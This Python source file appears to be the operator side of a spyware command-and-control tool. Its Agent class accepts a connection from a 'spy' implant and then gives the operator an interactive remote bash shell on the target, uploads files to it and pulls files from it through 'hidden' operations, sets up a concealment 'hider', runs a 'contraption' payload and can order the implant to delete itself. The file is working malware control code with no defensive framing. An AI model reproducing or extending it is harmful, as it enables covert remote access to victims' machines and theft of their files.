from connection import Connection
from listener import Listener
from command import Command
from responce import Responce
from funCode import FunCode
from status import Status
from contParams import *
from icecream import ic

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, conn: Connection, type="maneger") -> None:
        self.conn = conn
        self.type = type

    def __repr__(self) -> str:
        return f"Agent(self.conn={self.self.conn}, self.type={self.type})"

    @classmethod
    def listenSpyware(cls, listen_addr: tuple[str, int]):
        host, port = listen_addr
        with Listener(host, port) as listener:
            conn = listener.accept()
        return Agent(conn, "spy")

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, bash))
        return self.conn.recv_full_responce()

    """
    goes into loop of reading a command from stdin and executing on red side
    stops on sigint (or other exception/interrupt) or q
    """

    def bash_mode(self):
        try:
            while True:
                line = input("$ ")
                if line == "q":
                    break
                print(self.run_bash(line))
        except Exception as e:
            print(e)

    def write_file(self, homeFilePath, targetFileName: str) -> Responce:

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(ic(len(fileContent)), FunCode.WRITE_FILE, 0, targetFileName)
        )
        self.conn.send_data(fileContent)
        return self.conn.recv_responce_struct()

    def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
        self.conn.send_command(
            Command(
                0,
                FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_RETREIVE_FILE,
                0,
                fileName,
            )
        )
        file_data = self.conn.recv_file()
        res = self.conn.recv_responce_struct()
        return res, file_data

    def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD not in fncode

        self.conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
        results = list()
        results.append(self.conn.recv_bytes(Status.sizeof))
        results.append(self.conn.recv_bytes(Status.sizeof))
        results.append(self.conn.recv_bytes(Status.sizeof))
        return self.conn.recv_full_responce(), results

    def hidden_action_with_upload(
        self, fncode: FunCode, homeFilePath, targetFileName: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD in fncode

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        self.conn.send_command(
            Command(
                ic(len(fileContent)),
                FunCode.HIDDEN_OPRATION | fncode,
                0,
                targetFileName,
            )
        )
        self.conn.send_data(fileContent)
        results = list()
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        results.append(self.conn.recv_responce_struct())
        return self.conn.recv_full_responce(), results

    # prob redundant in future
    def hider_setup(self, hiderPath: str) -> Responce:
        self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, hiderPath))
        return self.conn.recv_responce_struct()

    def suicide(self):
        self.conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
        res = self.conn.recv_responce_struct()
        assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
        return res

    def runContraption(self, params: ContParams, identifier: int):
        self.conn.send_command(Command(0, FunCode.RunContraption, identifier, ""))
        self.conn.send_data(bytes(params))
        res = self.conn.recv_responce_struct()
        return res
